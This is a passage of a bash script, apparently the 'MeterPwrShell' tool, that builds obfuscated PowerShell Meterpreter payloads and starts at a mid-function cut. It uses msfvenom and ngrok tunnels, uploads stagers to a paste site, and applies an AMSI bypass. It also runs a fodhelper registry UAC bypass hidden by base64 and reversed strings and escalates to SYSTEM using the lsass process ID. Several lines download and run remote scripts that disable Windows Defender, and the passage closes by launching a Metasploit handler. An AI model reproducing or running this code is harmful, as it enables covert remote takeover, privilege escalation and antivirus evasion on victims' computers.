Set-ItemProperty -Path "$reghive" -Name "(default)" -Value $program -Force
Start-Process "$process" -WindowStyle Hidden
Start-Sleep 4
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
Remove-Variable fillmybuffer
[System.GC]::Collect()
EOM
echo "#crafting payload executer" &>> .debug.log
payloadstagerlink=`curl --silent --data "$UACBYPASS" 'https://paste.c-net.org/'`
echo "powershell.exe -nop -ep bypass -Command \"$AMSIBYPASSCODEINRAW;IEX(New-Object Net.WebClient).DownloadString('$payloadstagerlink');\"" &>> meterpwrshell.output.$payarch.$SESSIONID.txt                        
echo -e "use exploit/multi/handler\nset payload $msfpaytype\nset lhost localhost\nset lport $yourport\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo true\nset AutoLoadStdapi true\nexploit -j" >> meterpwrshell.handler.$payarch.$SESSIONID.rc
mv meterpwrshell.handler.$payarch.$SESSIONID.rc output/
echo "#moving payload executer to output/" &>> .debug.log
mv meterpwrshell.output.$payarch.$SESSIONID.txt output/
echo "#deleting unused meterpreter powershell payload" &>> .debug.log
rm 1.ps1 &>> .debug.log
}
generatepayloadwithoutprependmigrate () {
if [[ -f /usr/bin/ngrok ]]; then
    echo "#ngrok executeable already exist in /usr/bin" &>> .debug.log
else
    echo "#downloading ngrok executeable" &>> .debug.log
    wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip &>> .debug.log
    echo "#unzipping ngrok executeable zip" &>> .debug.log
    unzip ngrok-stable-linux-amd64.zip
    chmod +x ngrok
    echo "#moving ngrok executeable to /usr/bin" &>> .debug.log
    mv ngrok /usr/bin
    rm ngrok-stable-linux-amd64.zip
fi
if [[ "$ngrokauthtokenexist" = "no" ]]; then
    echo "#adding your authtoken to ngrok config file"&>> .debug.log
    ngrok authtoken $ngrokauthtoken &>> .debug.log
fi
rm ngrok.debug.log &>> .debug.log
echo "#ngrok started,you can view ngrok log at ngrok.debug.log" &>> .debug.log
if echo "$msfpaytype" | grep -Fq "http"; then
    ngrok http $yourport --log=stdout >> ngrok.debug.log &
else
    ngrok tcp $yourport --log=stdout >> ngrok.debug.log &
fi
read -t 10 #waiting ngrok to establish the connection,hopefully 10 second is enough
echo -e $BlueF "We Started The Ngrok Port Forwarder On The Background, You Can Kill It Later If You Dont Use It Anymore With : kill \$(pgrep ngrok)"
ngrokwebrequest=`curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"tcp:..([^"]*).*/\1/p'`
ngrokaddr=`echo $ngrokwebrequest | cut -f1 -d:`
ngrokport=`echo $ngrokwebrequest | cut -f2 -d:`
msfvenom -p $msfpaytype LHOST=$ngrokaddr LPORT=$ngrokport --smallest -f psh -o 1.ps1 &>> .debug.log                         
echo "#uploading payload to paste.c-net.org" &>> .debug.log
msfpayloadlink=`curl --silent --upload-file '1.ps1' 'https://paste.c-net.org/'`
AMSIBYPASSCODEINRAW=`echo $AMSIBYPASSCODEINBASE64 | base64 -d | iconv --to-code UTF8`
read -r -d '' stage3 <<- EOM 
\$procid = get-process lsass | select -expand id;
\$accesspsgetsys = Invoke-WebRequest https://raw.githubusercontent.com/GetRektBoy724/sementara/master/psgetsys.ps1 -UseBasicParsing;
Invoke-Expression \$accesspsgetsys;
[AkuDitemeninOrangTuaKu]::MintakSYSTEMCuk(\$procid,"C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe","-nop -ep bypass -NoExit -Command \`"\`\$accessstartup = Invoke-WebRequest https://raw.githubusercontent.com/GetRektBoy724/sementara/master/OneDoesNotSimplyBypassEntireWinDefender.ps1 -UseBasicParsing;Invoke-Expression \`\$accessstartup.Content;Invoke-Expression(New-Object Net.WebClient).DownloadString('$msfpayloadlink');\`"");
EOM
echo "#crafting UAC bypass" &>> .debug.log
echo "#uploading stager to paste.c-net.org" &>> .debug.log
stage3link=`wget --quiet -O- --post-data="$stage3" 'https://paste.c-net.org/'`
read -r -d '' encodecommand <<- EOM
powershell.exe -nop -ep bypass -Command "\$accessstartup = Invoke-WebRequest https://raw.githubusercontent.com/GetRektBoy724/sementara/master/UACBStartup.ps1 -UseBasicParsing;Invoke-Expression \$accessstartup.Content;Invoke-Expression(New-Object Net.WebClient).DownloadString('$stage3link');"
EOM
encodecommandinbase64=`echo -n "$encodecommand" | base64 | tr -d '\n'`
reverseencodecommandinbase64=`echo "$encodecommandinbase64" | rev`
AIObypass="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
AIObypassinbase64="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
reversecommandinbase64="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
reversingcommandinbase64="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
reversingcommandinbase642="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
reghiveinbase64="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
reghive="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
commandinbase64="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
command="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
processinbase64="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
process="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
accessAIObypass="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
program="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
read -r -d '' UACBYPASS <<- EOM
$AIObypassinbase64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dldFJla3RCb3k3MjQvc2VtZW50YXJhL21hc3Rlci9PbmVEb2VzTm90U2ltcGx5QnlwYXNzRW50aXJlV2luRGVmZW5kZXIucHMx"
$AIObypass = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$AIObypassinbase64"))
$reghiveinbase64 = "SEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xTaGVsbFxPcGVuXGNvbW1hbmQ="
$reghive = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$reghiveinbase64"))
$reversecommandinbase64 = "$reverseencodecommandinbase64"
$reversingcommandinbase64 = $reversecommandinbase64.ToCharArray()
[array]::Reverse($reversingcommandinbase64)
$reversingcommandinbase642 = -join($reversingcommandinbase64)
$command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$reversingcommandinbase642"))
$processinbase64 = "QzpcV2luZG93c1xTeXN0ZW0zMlxmb2RoZWxwZXIuZXhl"
$process = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$processinbase64"))
$accessAIObypass = Invoke-WebRequest $AIObypass -UseBasicParsing
Invoke-Expression $accessAIObypass.Content
New-Item "$reghive" -Force
New-ItemProperty -Path "$reghive" -Name "DelegateExecute" -Value "" -Force
$program = "$command"
Set-ItemProperty -Path "$reghive" -Name "(default)" -Value $program -Force
Start-Process "$process" -WindowStyle Hidden
Start-Sleep 4
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
Remove-Variable fillmybuffer
[System.GC]::Collect()
EOM
echo "#crafting payload executer" &>> .debug.log
payloadstagerlink=`curl --silent --data "$UACBYPASS" 'https://paste.c-net.org/'`
echo "powershell.exe -nop -ep bypass -Command \"$AMSIBYPASSCODEINRAW;IEX(New-Object Net.WebClient).DownloadString('$payloadstagerlink');\"" &>> meterpwrshell.output.$payarch.$SESSIONID.txt                        
echo -e "use exploit/multi/handler\nset payload $msfpaytype\nset lhost localhost\nset lport $yourport\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo true\nset AutoLoadStdapi true\nexploit -j" >> meterpwrshell.handler.$payarch.$SESSIONID.rc
mv meterpwrshell.handler.$payarch.$SESSIONID.rc output/
echo "#moving payload executer to output/" &>> .debug.log
mv meterpwrshell.output.$payarch.$SESSIONID.txt output/
echo "#deleting unused meterpreter powershell payload" &>> .debug.log
rm 1.ps1 &>> .debug.log
}
#[--------------------------END .debug.log ZONE--------------------------]
echo -e $okegreen "[-----------------------------------------------------------] "
echo -e $okegreen "[---] The One-Liner Meterpreter/Custom Powershell Payload Has Been Maked By MeterPwrShell [---]"
if [[ $custompayload = no ]]; then
    echo -e $okegreen "[---] The Output File Is On The : output/meterpwrshell.output.$payarch.$SESSIONID.txt [---]"
else
    echo -e $okegreen "[---] The Output File Is On The : output/meterpwrshell.output.$victimarch.$SESSIONID.txt [---]"
fi
if [[ $custompayload = no ]]; then
    echo -e $okegreen "[---] The Handler File Is On The : output/meterpwrshell.handler.$payarch.$SESSIONID.rc [---]"
fi
echo -e $okegreen "[-----------------------------------------------------------] "
echo -e $okegreen "[---] If Your Payload Is Using Base64 As The One-Liner [---]"
echo -e $okegreen "[---] It Is Recommended To Check Whether Your Payload That Generated By MeterPwrShell Is Broken Or Not [---]"
echo -e $okegreen "[---] You Can Check It At : https://raikia.com/tool-powershell-encoder/ [---]"
echo -e $okegreen "[-----------------------------------------------------------] "
while true; do
    if [[ $custompayload = no ]]; then
        echo -ne $okegreen "[---] Do You Want To Start The Metasploit Handler ??? [---] (yes/no) : ";tput sgr0
        read startmsfhandler
        if [ "$startmsfhandler" = "yes" ]; then
            echo -e $okegreen "${boldcharacters}[---] Launching,Please Wait ...... [---]"
            cd output/
            msfconsole -r meterpwrshell.handler.$payarch.$SESSIONID.rc
            echo -e $okegreen "${boldcharacters} This Tool Is Not Completely Bugless"
            echo -e $okegreen " If You Find A Bug...Please Report It At https://github.com/GetRektboy724/MeterPwrShell/issues"
            cowsay -f dragon " Follow Me At https://github.com/GetRektBoy724 Or I Will Kill You!!!"
            break
        fi
        if [ "$startmsfhandler" = "no" ]; then
            echo -e $okegreen "${boldcharacters} This Tool Is Not Completely Bugless"
            echo -e $okegreen " If You Find A Bug...Please Report It At https://github.com/GetRektboy724/MeterPwrShell/issues"
            cowsay -f dragon " Follow Me At https://github.com/GetRektBoy724 Or I Will Kill You!!!"
            exit
        else
            echo -e $red "[!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
        fi
    else
        echo -e $okegreen "${boldcharacters} This Tool Is Not Completely Bugless"
        echo -e $okegreen " If You Find A Bug...Please Report It At https://github.com/GetRektboy724/MeterPwrShell/issues"
        cowsay -f dragon " Follow Me At https://github.com/GetRektBoy724 Or I Will Kill You!!!" 
        break
    fi
done
